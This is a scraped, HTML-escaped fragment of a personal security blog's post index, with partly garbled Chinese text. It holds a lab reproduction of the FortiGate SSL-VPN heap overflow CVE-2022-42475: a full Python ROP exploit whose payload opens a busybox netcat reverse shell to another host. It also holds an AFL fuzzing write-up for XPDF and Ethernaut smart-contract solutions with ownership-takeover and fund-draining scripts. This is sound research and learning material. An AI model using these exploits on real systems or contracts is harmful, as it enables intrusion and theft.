&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240818183810.png&#34; alt=&#34;Pasted image 20240818183810.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ËßÇÂØüÊ≠§Êó∂ÂÜÖÂ≠òÂ∏ÉÂ±ÄÔºåÂπ∂ÁªìÂêà‰πãÂâçÁöÑÊ±áÁºñ&lt;code&gt;mov     rax, [rdx+0C0h]&lt;/code&gt;ÔºåÊàë‰ª¨ÂèØ‰ª•Âú®rdxÂú∞ÂùÄ‰∏äÂ≠òÂÇ®Êàë‰ª¨ÁöÑropÈìæÔºåÂπ∂Âú®&lt;code&gt;+0xc0&lt;/code&gt;ÂÅèÁßªÂ§Ñ(Âç≥poc‰∏≠ÁöÑret)Â≠òÊîæÊàë‰ª¨ÁöÑpivot gadgetÔºåÂπ∂‰∏îgadgetÈúÄË¶ÅÂåÖÂê´&lt;code&gt;push rdx ; pop rsp&lt;/code&gt;Ôºå‰ªéËÄåËøÅÁßªÂà∞ropÈìæÂ§Ñ&lt;/p&gt;
&lt;p&gt;initÂ§™Â§ßÔºåËæìÂá∫Âà∞txtÊñá‰ª∂Êü•Êâæ:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary &amp;quot;./init&amp;quot; &amp;gt; 3.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÁªàÊàë‰ª¨ÈÄâÊã©&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;0x0000000000febbaa : push rdx ; pop rsp ; add eax, 0x83480deb ; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ââ©‰∏ãÁöÑgadgetÂ∞±ÊØîËæÉÂ•ΩÊâæ‰∫ÜÔºåÊ≥®ÊÑèÊúÄÂêéÂ†Ü‰∏äÊúâËÑèÊï∞ÊçÆËÆ∞Âæópadding&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240818204930.png&#34; alt=&#34;Pasted image 20240818204603.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/login&amp;quot;.encode()
# content_length = [&amp;quot;0&amp;quot;, &amp;quot;-1&amp;quot;, &amp;quot;2147483647&amp;quot;, &amp;quot;2147483648&amp;quot;, &amp;quot;-0&amp;quot;,
#                   &amp;quot;4294967295&amp;quot;, &amp;quot;4294967296&amp;quot;, &amp;quot;1111111111111&amp;quot;, &amp;quot;22222222222&amp;quot;]

content_length = &amp;quot;115964116992&amp;quot;

# 2147483647 int max
# 2147483648 max+1 -&amp;gt; -2147483648
# 4294967295 unsigned int max
# 4294967296 max+1 -&amp;gt; 0
# 1111111111111
# 2222222222222

# 0x000000000043a016 : ret
ret = 0x000000000043a016
counter = 0


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


socks = []

for i in range(60):
    sk = create_ssl_ctx()
    data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: 2000\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&amp;quot;
    sk.sendall(data)
    socks.append(sk)

for i in range(20, 40, 2):
    sk = socks[i]
    sk.close()
    socks[i] = None

# payload = cyclic(0x4000)

sys_addr = 0x00000000005693C5
# .text:00000000005693C5 E8 46 58 ED FF                call    _system

pivot_gadget = 0x0000000000febbaa
# 0x0000000000febbaa : push rdx ; pop rsp ; add eax, 0x83480deb ; ret

pop_rax = 0x000000000046bb27
# 0x000000000046bb27 : pop rax ; ret

pop_rax_rcx = 0x000000000060b2fe
# 0x000000000060b2fe : pop rax ; pop rcx ; ret


add_rdx_rax = 0x0000000002a0e0e0
# 0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret

push_rdx_pop_rdi = 0x000000000257008a
# 0x000000000257008a : push rdx ; pop rdi ; ret

pop_rsi = 0x0000000000530c8e
# 0x0000000000530c8e : pop rsi ; ret

pop_rdx = 0x0000000000509372
# 0x0000000000509372 : pop rdx ; ret

add_rcx_r13 = 0x0000000000aac1d0
# 0x0000000000aac1d0 : add rcx, r13 ; ret

payload = b&amp;quot;B&amp;quot;*(3616-0xc0)
payload += p64(pop_rax_rcx)
payload += p64(0x50)
payload += p64(add_rcx_r13)  # padding
payload += p64(add_rdx_rax)
payload += p64(push_rdx_pop_rdi)
payload += p64(pop_rsi)+p64(0)
payload += p64(pop_rdx)+p64(0)
payload += p64(sys_addr)
payload += b&amp;quot;/bin/busybox nc 192.168.122.128 4444 -e /bin/sh&amp;quot;
payload += b&amp;quot;\x00&amp;quot;
payload = payload.ljust(3616, b&amp;quot;A&amp;quot;)+p64(pivot_gadget)
print(&amp;quot;[+] &amp;quot;+str(content_length)+&amp;quot; :&amp;quot;)
data = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    content_length.encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload
client = create_ssl_ctx()


for i in range(20):
    sk = create_ssl_ctx()
    socks.append(sk)


client.sendall(data)


for sk in socks:
    if sk:
        data = b&amp;quot;b&amp;quot; * 40
        sk.sendall(data)
&lt;/code&gt;&lt;/pre&gt;
">CVE-2022-42475 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0YuGrllUj/"" data-c="
          &lt;h1 id=&#34;cve-2019-13288-in-xpdf-302&#34;&gt;CVE-2019-13288 in XPDF 3.02&lt;/h1&gt;
&lt;h2 id=&#34;build&#34;&gt;build:&lt;/h2&gt;
&lt;p&gt;build.sh:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=$PWD/bd
make
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;fuzzing&#34;&gt;fuzzing:&lt;/h2&gt;
&lt;p&gt;start.sh:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
afl-fuzz -i $PWD/ipt -o $PWD/opt -s 123 -m none -- $PWD/bd/bin/pdftotext @@ $PWD/output
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we get crash below :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;
 american fuzzy lop ++4.09a {default} (.../xpdf-3.02/bd/bin/pdftotext) [fast]
‚îå‚îÄ process timing ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ overall results ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ        run time : 0 days, 0 hrs, 48 min, 47 sec     ‚îÇ  cycles done : 0     ‚îÇ
‚îÇ   last new find : 0 days, 0 hrs, 0 min, 4 sec       ‚îÇ corpus count : 782   ‚îÇ
‚îÇlast saved crash : 0 days, 0 hrs, 7 min, 51 sec      ‚îÇsaved crashes : 5     ‚îÇ
‚îÇ last saved hang : 0 days, 0 hrs, 4 min, 29 sec      ‚îÇ  saved hangs : 2     ‚îÇ
‚îú‚îÄ cycle progress ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ map coverage‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  now processing : 781.0 (99.9%)      ‚îÇ    map density : 2.81% / 4.58%      ‚îÇ
‚îÇ  runs timed out : 0 (0.00%)          ‚îÇ count coverage : 4.10 bits/tuple    ‚îÇ
‚îú‚îÄ stage progress ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ findings in depth ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  now trying : trim 64/64             ‚îÇ favored items : 63 (8.06%)          ‚îÇ
‚îÇ stage execs : 47/384 (12.24%)        ‚îÇ  new edges on : 138 (17.65%)        ‚îÇ
‚îÇ total execs : 1.10M                  ‚îÇ total crashes : 5 (5 saved)         ‚îÇ
‚îÇ  exec speed : 321.8/sec              ‚îÇ  total tmouts : 37 (0 saved)        ‚îÇ
‚îú‚îÄ fuzzing strategy yields ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ item geometry ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   bit flips : disabled (default, enable with -D)   ‚îÇ    levels : 21        ‚îÇ
‚îÇ  byte flips : disabled (default, enable with -D)   ‚îÇ   pending : 557       ‚îÇ
‚îÇ arithmetics : disabled (default, enable with -D)   ‚îÇ  pend fav : 2         ‚îÇ
‚îÇ  known ints : disabled (default, enable with -D)   ‚îÇ own finds : 780       ‚îÇ
‚îÇ  dictionary : n/a                                  ‚îÇ  imported : 0         ‚îÇ
‚îÇhavoc/splice : 572/451k, 213/333k                   ‚îÇ stability : 100.00%   ‚îÇ
‚îÇpy/custom/rq : unused, unused, unused, unused       ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
‚îÇ    trim/eff : 3.39%/310k, disabled                 ‚îÇ          [cpu000:  6%]
‚îî‚îÄ strategy: explore ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ state: in progress ‚îÄ‚îÄ‚îò
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;analyze&#34;&gt;analyze:&lt;/h2&gt;
&lt;p&gt;use tmin to minimize the crashes&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
mkdir -p $PWD/opt/default/minimized
for i in $PWD/opt/default/crashes/id* ; do afl-tmin -i $i -o $PWD/opt/default/minimized/`basename $i` -- $PWD/bd/bin/pdftotext @@ $PWD/output ; done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;rebuild with dbg symbols and feed the crash sample&lt;br&gt;
gdb dbg:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; gdb --args ./pdftotext id:000000,sig:11,src:000499,time:429922,execs:198634,op:havoc,rep:4 ./1
 start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;step to the crash point and look up backtrace , we entered a infinete loop at src &lt;code&gt;Parser.cc:94&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;[#0] Id 1, Name: &amp;quot;pdftotext&amp;quot;, stopped 0x7ffff7af1e57 in _int_malloc (), reason: SIGSEGV
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ trace ‚îÄ‚îÄ‚îÄ‚îÄ
[#0] 0x7ffff7af1e57 ‚Üí _int_malloc(av=0x7ffff7c68c80 &amp;lt;main_arena&amp;gt;, bytes=0x158)
[#1] 0x7ffff7af3262 ‚Üí __GI___libc_malloc(bytes=0x158)
[#2] 0x7ffff7e2c98c ‚Üí operator new(unsigned long)()
[#3] 0x5555555e2ca3 ‚Üí FileStream::makeSubStream(this=0x555555693c00, startA=0xa, limitedA=0x0, lengthA=0x0, dictA=0x7fffff7ff130)
[#4] 0x5555555f7a7c ‚Üí XRef::fetch(this=0x555555695230, num=0x4, gen=0x0, obj=0x7fffff7ff1e0)
[#5] 0x5555555e016f ‚Üí Object::dictLookup(obj=0x7fffff7ff1e0, key=0x55555560c1c6 &amp;quot;Length&amp;quot;, this=0x7fffff7ff3a0)
[#6] 0x5555555e016f ‚Üí Parser::makeStream(this=0x555556bc5a60, dict=0x7fffff7ff3a0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x4, objGen=0x0)
[#7] 0x5555555e071c ‚Üí Parser::getObj(this=0x555556bc5a60, obj=0x7fffff7ff3a0, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0x0, objNum=0x4, objGen=0x0)
[#8] 0x5555555f7bbd ‚Üí XRef::fetch(this=0x555555695230, num=0x4, gen=0x0, obj=0x7fffff7ff3a0)
[#9] 0x5555555e016f ‚Üí Object::dictLookup(obj=0x7fffff7ff3a0, key=0x55555560c1c6 &amp;quot;Length&amp;quot;, this=0x7fffff7ff560)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;here causes a recursion, will finally run out of stack memory&lt;/p&gt;
&lt;h2 id=&#34;mitigation&#34;&gt;mitigation:&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;#define recursionLimit 500&lt;/code&gt; and exit after reaching the limit .&lt;/p&gt;
&lt;h1 id=&#34;cve-2009-3895-cve-2012-2836-in-libexif-0614&#34;&gt;CVE-2009-3895 CVE-2012-2836 in libexif 0.6.14&lt;/h1&gt;
">Fuzzing101</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/3TfrFzmb/"" data-c="
          &lt;h2 id=&#34;fallback&#34;&gt;Fallback&lt;/h2&gt;
&lt;p&gt;our goal :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;claim ownership of the contract&lt;/li&gt;
&lt;li&gt;reduce its balance to 0&lt;br&gt;
original contract:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address =&amp;gt; uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, &amp;quot;caller is not the owner&amp;quot;);
        _;
    }

    function contribute() public payable {
        require(msg.value &amp;lt; 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] &amp;gt; contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value &amp;gt; 0 &amp;amp;&amp;amp; contributions[msg.sender] &amp;gt; 0);
        owner = msg.sender;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;as we send eth to the contract , the ownership automatically changed to us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;         receive ETH
              |
         msg.data emptyÔºü
            /  \
           T    F
          /      \
receive() exists?   fallback()
        / \
       T   F
      /     \
receive()   fallback()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;so the answer:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;contibute&lt;/code&gt; to fund our account in contract&lt;/li&gt;
&lt;li&gt;&lt;code&gt;call{value: }(&amp;quot;&amp;quot;)&lt;/code&gt; to send eth to contract , trigger the &lt;code&gt;fallback&lt;/code&gt; (in this case &lt;code&gt;receive&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;owner changed and &lt;code&gt;withdraw&lt;/code&gt; all the fund in contract&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {Fallback} from &amp;quot;../src/Fallback.sol&amp;quot;;

error callFailed();

contract fallBackSolution is Script {
    function run() external {
        uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
        Fallback fallBackInstance = Fallback(payable(vm.envAddress(&amp;quot;FALLBACK_ADDRESS&amp;quot;)));
        // Fallback fallBackInstance = Fallback(payable(0x8Dafc24Ac2B813590f0a6b007159a1140c5Fd33c));

        console.log(&amp;quot;fallbackInstanceAddress: &amp;quot;, address(fallBackInstance));

        vm.startBroadcast(PK);

        fallBackInstance.contribute{value: 1}();

        (bool temp,) = payable(fallBackInstance).call{value: 1}(&amp;quot;&amp;quot;);
        if (!temp) revert callFailed();

        console.log(&amp;quot;New owner: &amp;quot;, fallBackInstance.owner());

        fallBackInstance.withdraw();

        vm.stopBroadcast();
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;fallout&#34;&gt;Fallout&lt;/h2&gt;
&lt;p&gt;our goal:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;claim the ownership&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;original contract:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &amp;quot;openzeppelin-contracts-06/math/SafeMath.sol&amp;quot;;
// forge install openzeppelin-contracts-06=OpenZeppelin/openzeppelin-contracts@v3.4.0

contract Fallout {
    using SafeMath for uint256;

    mapping(address =&amp;gt; uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, &amp;quot;caller is not the owner&amp;quot;);
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] &amp;gt; 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call the function &lt;code&gt;Fal1out&lt;/code&gt; to gain the ownership&lt;/p&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {Fallout} from &amp;quot;../src/Fallout.sol&amp;quot;;

contract CounterScript is Script {
    uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
    address instanceAddress = vm.envAddress(&amp;quot;FALLOUT_ADDRESS&amp;quot;);

    function run() public {
        Fallout fallOut = Fallout(instanceAddress);

        vm.startBroadcast(PK);

        console.log(&amp;quot;contract owner: &amp;quot;, fallOut.owner());
        console.log(&amp;quot;calling Fal1out...&amp;quot;);

        fallOut.Fal1out();

        console.log(&amp;quot;contract owner: &amp;quot;, fallOut.owner());

        vm.stopBroadcast();
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;coinflip&#34;&gt;CoinFlip&lt;/h2&gt;
&lt;p&gt;our goal:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;win 10 times in a row&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;original contract:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the contract uses unsafe factor which we can predict the side of coin each time&lt;br&gt;
when writing exp , there are few things need to concern:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;block.number&lt;/code&gt; was &lt;code&gt;0&lt;/code&gt; when not pointed , use &lt;code&gt;vm.roll()&lt;/code&gt; to set block number, otherwise it may take underflow error&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;--tc CoinFlipScript&lt;/code&gt; to point which contract to run&lt;/li&gt;
&lt;li&gt;The contract has hash check, however ,when we do local simulation the hash won&#39;t change. So use &lt;code&gt;--skip-simulation&lt;/code&gt; to skip simulation check&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Script, console} from &amp;quot;forge-std/Script.sol&amp;quot;;
import {CoinFlip} from &amp;quot;../src/CoinFlip.sol&amp;quot;;

contract exp {
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 _tp = blockValue / FACTOR;

        console.log(&amp;quot;_tp: &amp;quot;, _tp);
        bool _side = _tp == 1 ? true : false;
        console.log(&amp;quot;_side: &amp;quot;, _side);

        _coinFlip.flip(_side);
    }
}

contract CoinFlipScript is Script {
    uint256 PK = vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;);
    address instanceAddress = vm.envAddress(&amp;quot;COINFLIP_ADDRESS&amp;quot;);
    CoinFlip coinFlipInstance = CoinFlip(instanceAddress);
    // function setUp() public {}

    function run() public {
        // vm.broadcast();
        vm.roll(100);
        vm.startBroadcast(PK);
        for (uint256 i = 0; i &amp;lt; 10; i++) {
            vm.roll(100 + i);
            new exp(coinFlipInstance);
            console.log(&amp;quot;wins: &amp;quot;, coinFlipInstance.consecutiveWins());
        }
        vm.stopBroadcast();
    }
}

&lt;/code&gt;&lt;/pre&gt;
">Ethernaut challenges</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/SnPoU1Mup/"" data-c="
          &lt;h2 id=&#34;about-blockchain&#34;&gt;About blockchain&lt;/h2&gt;
&lt;h3 id=&#34;general&#34;&gt;general&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;smart contract is turing complete&lt;/li&gt;
&lt;li&gt;decentralized Oracle network(chainlink)+smart contracts == hybrid contracts&lt;/li&gt;
&lt;li&gt;Transaction fee = gasPrice * gasUsed&lt;/li&gt;
&lt;li&gt;SHA-like to process the data&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-it-worked&#34;&gt;how it worked&lt;/h3&gt;
&lt;h4 id=&#34;block-and-hash&#34;&gt;block and hash&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;blockchain built with block,¬†a block is divided into &lt;code&gt;block&lt;/code&gt;, &lt;code&gt;nunce&lt;/code&gt;, and &lt;code&gt;data&lt;/code&gt;.¬†All three are then run through the hash algorithm, producing the hash for that block.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;immutability&#34;&gt;Immutability&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;any changes of hash will make the rest of the chain invalidated&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;decentralization-distributed&#34;&gt;Decentralization &amp;amp; Distributed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;multiple entities or &amp;quot;peers&amp;quot; run the blockchain technology, each holding equal weight and power.&lt;/li&gt;
&lt;li&gt;the majority rules&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;private-public-key&#34;&gt;Private &amp;amp;&amp;amp; Public key&lt;/h4&gt;
&lt;h3 id=&#34;sign-a-transaction&#34;&gt;sign a transaction&lt;/h3&gt;
&lt;h4 id=&#34;use-private-key-to-sign-a-signature&#34;&gt;use private key to sign a signature:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;signature = sign(data, private_key)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;signature-created-to-use-public-key-to-verify-the-validation&#34;&gt;signature created to use public key to verify the validation:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;verify(signature, public_key)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Your private key is super-secret, held securely by you alone as it holds the power to authorize transactions.&lt;/li&gt;
&lt;li&gt;The public key created via digital signature algorithm on your private key verifies your transaction signatures.&lt;/li&gt;
&lt;li&gt;The Ethereum address, an offshoot of your public key, is publicized and harmless.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;proof-of-work&#34;&gt;Proof of Work:&lt;/h3&gt;
&lt;p&gt;a civil resistance mechanism, a way to avert potential Sybil attacks&lt;br&gt;
(A Sybil attack is when a user creates numerous pseudonymous identities aiming to gain a disproportionately influential sway over the system.)&lt;/p&gt;
&lt;h3 id=&#34;l1-l2&#34;&gt;L1 &amp;amp;&amp;amp; L2:&lt;/h3&gt;
&lt;p&gt;these two options are developed to deal with the scaling issues, &lt;code&gt;L2 on top of L1&lt;/code&gt; extend &lt;code&gt;L1&lt;/code&gt; capabilities.&lt;/p&gt;
&lt;h2 id=&#34;solidity&#34;&gt;Solidity&lt;/h2&gt;
&lt;h3 id=&#34;of-function&#34;&gt;of function&lt;/h3&gt;
&lt;ul&gt;
